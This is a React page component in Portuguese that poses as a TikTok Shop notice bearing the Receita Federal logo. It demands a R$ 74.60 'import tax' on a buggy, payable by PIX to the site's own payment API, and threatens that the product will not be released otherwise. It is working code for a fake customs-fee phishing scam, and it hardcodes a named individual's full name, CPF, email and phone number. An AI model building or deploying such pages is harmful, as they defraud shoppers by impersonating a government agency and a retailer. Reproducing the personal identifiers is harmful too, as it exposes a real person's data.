import { useState, useEffect } from 'react';
import { AlertTriangle, Copy, CheckCircle } from 'lucide-react';

export default function TaxaPage() {
  const [showModal, setShowModal] = useState(false);
  const [isGeneratingPayment, setIsGeneratingPayment] = useState(false);
  const [pixCode, setPixCode] = useState('');
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [copied, setCopied] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState('pending');
  
  const TAXA_VALOR = 74.60;
  const DADOS_FIXOS = {
    nome: 'PAULO ALVES DA SILVA',
    cpf: '06953135417',
    email: 'poulsi14@gmail.com',
    telefone: '11959107965'
  };

  // Polling para verificar status do pagamento
  useEffect(() => {
    if (!transactionId || paymentStatus === 'paid') return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/payments/${transactionId}`);
        const data = await response.json();
        
        const paymentData = data.data || data;
        
        if (paymentData.status === 'paid' || paymentData.status === 'approved') {
          setPaymentStatus('paid');
          clearInterval(interval);
          
          setTimeout(() => {
            window.location.href = '/';
          }, 2000);
        }
      } catch (error) {
        console.error('Erro ao verificar status:', error);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [transactionId, paymentStatus]);

  const handleRegularizar = async () => {
    setShowModal(true);
    setIsGeneratingPayment(true);
    
    try {
      // Remover acentos do email para evitar erro na API
      const emailSemAcento = DADOS_FIXOS.email
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '');

      const paymentData = {
        amount: TAXA_VALOR.toFixed(2), // String em reais
        customer_name: DADOS_FIXOS.nome,
        customer_email: emailSemAcento,
        customer_cpf: DADOS_FIXOS.cpf,
        customer_phone: DADOS_FIXOS.telefone,
        description: 'Taxa de Importação - Buggy 29cc'
      };

      const response = await fetch('/api/payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData)
      });

      const responseData = await response.json();
      
      if (!response.ok) {
        throw new Error(responseData.error?.message || 'Erro ao criar pagamento');
      }

      const transaction = responseData.data || responseData;
      
      console.log('Transaction data:', transaction);
      
      setPixCode(transaction.pix_code || transaction.pixCode || '');
      setQrCodeUrl(transaction.qr_code_url || transaction.qrCodeUrl || transaction.pix_qr_code || '');
      setTransactionId(transaction.transaction_id || transaction.id || '');
      
    } catch (error: any) {
      console.error('Erro ao processar pagamento:', error);
      alert(`Erro ao processar pagamento: ${error.message || 'Tente novamente.'}`);
      setShowModal(false);
    } finally {
      setIsGeneratingPayment(false);
    }
  };

  const handleCopyPixCode = () => {
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-white min-h-screen" style={{ maxWidth: '428px', margin: '0 auto' }}>
      {/* Header Preto com Logo TikTok */}
      <div className="bg-black px-4 py-4">
        <img 
          src="https://jc.tec.br/wp-content/uploads/2022/09/Logo-Tiktok-Branco.png"
          alt="TikTok Shop"
          className="h-10 mx-auto object-contain"
        />
      </div>

      {/* Conteúdo Principal */}
      <div className="px-6 py-8">
        {/* Ícone de Alerta */}
        <div className="flex justify-center mb-6">
          <div className="bg-red-100 rounded-full p-6">
            <AlertTriangle className="w-16 h-16 text-red-600" />
          </div>
        </div>

        {/* Título */}
        <h1 className="text-2xl font-bold text-center mb-4 text-black">
          Produto Importado
        </h1>

        {/* Logo Receita Federal */}
        <div className="flex justify-center mb-6">
          <img 
            src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png"
            alt="Receita Federal"
            className="h-16 object-contain"
          />
        </div>

        {/* Aviso */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
          <p className="text-sm text-gray-700 mb-3" style={{ fontWeight: 400 }}>
            Este produto é de <strong className="font-bold">origem importada</strong> e está sujeito ao pagamento da <strong className="font-bold">Taxa de Importação</strong> conforme legislação vigente da Receita Federal do Brasil.
          </p>
          <p className="text-sm text-gray-700 mb-3" style={{ fontWeight: 400 }}>
            De acordo com a Instrução Normativa RFB nº 1.737/2017, produtos importados com valor acima de US$ 50,00 estão sujeitos ao <strong className="font-bold">Imposto de Importação</strong>.
          </p>
        </div>

        {/* Valor da Taxa */}
        <div className="bg-red-50 border border-red-200 rounded-lg p-6 mb-6">
          <div className="text-center">
            <p className="text-sm text-gray-600 mb-2" style={{ fontWeight: 400 }}>
              Valor da Taxa de Importação
            </p>
            <p className="text-4xl font-bold text-red-600 mb-3">
              R$ {TAXA_VALOR.toFixed(2).replace('.', ',')}
            </p>
            <p className="text-xs text-gray-500" style={{ fontWeight: 400 }}>
              Taxa calculada conforme alíquota de 60% sobre o valor do produto
            </p>
          </div>
        </div>

        {/* Aviso Importante */}
        <div className="bg-black text-white rounded-lg p-4 mb-8">
          <p className="text-sm font-semibold text-center">
            ⚠️ ATENÇÃO: Sem o pagamento desta taxa, o produto NÃO será liberado pela Receita Federal e NÃO poderá ser enviado para você.
          </p>
        </div>

        {/* Botão Regularizar */}
        <button
          onClick={handleRegularizar}
          className="w-full bg-[#F52B56] text-white py-4 rounded-lg font-bold text-lg hover:bg-[#d42448] transition-colors"
          data-testid="button-regularizar-pedido"
        >
          Regularizar Pedido
        </button>

        {/* Informações Adicionais */}
        <div className="mt-6 text-center">
          <p className="text-xs text-gray-500" style={{ fontWeight: 400 }}>
            Pagamento seguro via PIX
          </p>
          <p className="text-xs text-gray-500 mt-1" style={{ fontWeight: 400 }}>
            Após a confirmação do pagamento, seu pedido será liberado automaticamente
          </p>
        </div>
      </div>

      {/* Modal de Pagamento */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg max-w-md w-full max-h-[90vh] overflow-y-auto">
            {/* Header do Modal */}
            <div className="bg-[#F52B56] text-white p-4 rounded-t-lg">
              <div className="flex items-center justify-center space-x-2">
                {paymentStatus === 'paid' ? (
                  <>
                    <CheckCircle className="w-5 h-5" />
                    <span className="font-semibold">Pagamento Confirmado!</span>
                  </>
                ) : (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span className="font-semibold">
                      {isGeneratingPayment ? 'Gerando pagamento...' : 'Aguardando pagamento...'}
                    </span>
                  </>
                )}
              </div>
            </div>

            {/* Conteúdo do Modal */}
            <div className="p-6">
              {isGeneratingPayment ? (
                <div className="flex flex-col items-center justify-center py-8">
                  <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-[#F52B56] mb-4"></div>
                  <p className="text-gray-600" style={{ fontWeight: 400 }}>
                    Gerando código PIX...
                  </p>
                </div>
              ) : paymentStatus === 'paid' ? (
                <div className="text-center py-8">
                  <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
                  <p className="text-lg font-semibold text-green-600 mb-2">
                    Taxa paga com sucesso!
                  </p>
                  <p className="text-sm text-gray-600" style={{ fontWeight: 400 }}>
                    Redirecionando...
                  </p>
                </div>
              ) : (
                <>
                  {/* Valor */}
                  <div className="text-center mb-4">
                    <p className="text-sm text-gray-600 mb-1" style={{ fontWeight: 400 }}>
                      Valor a pagar
                    </p>
                    <p className="text-3xl font-bold text-black">
                      R$ {TAXA_VALOR.toFixed(2).replace('.', ',')}
                    </p>
                  </div>

                  {/* QR Code */}
                  {qrCodeUrl && (
                    <div className="flex justify-center mb-4">
                      <img 
                        src={qrCodeUrl} 
                        alt="QR Code PIX"
                        className="w-64 h-64 border-2 border-gray-200 rounded"
                        data-testid="img-qr-code"
                      />
                    </div>
                  )}

                  {/* Código PIX */}
                  {pixCode && (
                    <>
                      <div className="bg-gray-100 p-3 rounded mb-3">
                        <p className="text-xs text-gray-600 mb-2" style={{ fontWeight: 400 }}>
                          Código PIX Copia e Cola:
                        </p>
                        <p className="text-xs break-all font-mono text-gray-800" style={{ fontWeight: 400 }}>
                          {pixCode}
                        </p>
                      </div>

                      {/* Botão Copiar */}
                      <button
                        onClick={handleCopyPixCode}
                        className={`w-full py-3 rounded-lg font-semibold transition-colors ${
                          copied 
                            ? 'bg-green-500 text-white' 
                            : 'bg-[#F52B56] text-white hover:bg-[#d42448]'
                        }`}
                        data-testid="button-copiar-pix"
                      >
                        {copied ? (
                          <span className="flex items-center justify-center">
                            <CheckCircle className="w-5 h-5 mr-2" />
                            Código Copiado!
                          </span>
                        ) : (
                          <span className="flex items-center justify-center">
                            <Copy className="w-5 h-5 mr-2" />
                            Copiar Código PIX
                          </span>
                        )}
                      </button>
                    </>
                  )}

                  {/* Instruções */}
                  <div className="mt-4 text-center">
                    <p className="text-xs text-gray-500" style={{ fontWeight: 400 }}>
                      Abra o app do seu banco, escaneie o QR Code ou cole o código PIX para pagar
                    </p>
                  </div>
                </>
              )}
            </div>

            {/* Fechar Modal */}
            {!isGeneratingPayment && paymentStatus === 'pending' && (
              <div className="border-t p-4">
                <button
                  onClick={() => setShowModal(false)}
                  className="w-full py-2 text-gray-600 hover:text-gray-800 font-semibold"
                  data-testid="button-fechar-modal"
                >
                  Fechar
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
